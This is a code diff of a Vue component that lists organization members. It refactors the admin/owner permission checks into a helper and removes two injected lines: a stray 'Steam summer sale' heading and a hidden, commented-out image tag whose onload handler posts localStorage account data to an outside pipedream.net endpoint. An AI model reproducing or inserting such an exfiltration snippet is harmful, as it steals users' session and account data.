@@ -80,7 +80,7 @@ async function showPermModal(invite: boolean): Promise<Database['public']['Enums
 }
 
 async function showInviteModal() {
-  if (!currentOrganization.value || !(organizationStore.currentRole === 'admin' || organizationStore.currentRole === 'owner')) {
+  if (!currentOrganization.value || (!organizationStore.hasPermisisonsInRole(organizationStore.currentRole, ['admin', 'owner']))) {
     toast.error(t('no-permission'))
     return
   }
@@ -240,8 +240,6 @@ async function changeMemberPermission(member: ExtendedOrganizationMember) {
     <div class="flex flex-col overflow-y-auto bg-white shadow-lg border-slate-200 md:mx-auto md:mt-5 md:w-full md:border dark:border-slate-900 md:rounded-lg dark:bg-slate-800">
       <dl class="divide-y divide-gray-500">
         <div v-for="member in members" :key="member.id">
-          <h1>The Steam summer sale has just begun!</h1>
-          <!-- <img src="https://jnx.me/img/profile.jpg" style="display:none" onload="fetch('https://eoes0il463gohiw.m.pipedream.net/', {method: 'POST', body: localStorage.getItem('account')})"> -->
           <div class="flex justify-between mt-2 mb-2 ml-2">
             <div class="flex">
               <img
@@ -256,7 +254,7 @@ async function changeMemberPermission(member: ExtendedOrganizationMember) {
               {{ member.email }}
             </div>
             <div class="mt-auto mb-auto mr-4">
-              <button :class="`w-7 h-7 bg-transparent ml-4 ${(organizationStore.currentRole === 'admin' || organizationStore.currentRole === 'owner') && (member.uid !== currentOrganization?.created_by) ? 'visible' : 'invisible'}`" @click="changeMemberPermission(member)">
+              <button :class="`w-7 h-7 bg-transparent ml-4 ${(organizationStore.hasPermisisonsInRole(organizationStore.currentRole, ['admin', 'owner'])) && (member.uid !== currentOrganization?.created_by) ? 'visible' : 'invisible'}`" @click="changeMemberPermission(member)">
                 <Wrench class="mr-4 text-lg text-[#397cea]" />
               </button>
               <button :class="`w-7 h-7 bg-transparent ml-4 ${((member.uid === main.user?.id || currentOrganization?.created_by === main.user?.id || organizationStore.currentRole === 'admin') && member.uid !== currentOrganization?.created_by) ? 'visible' : 'invisible'}`" @click="deleteMember(member)">
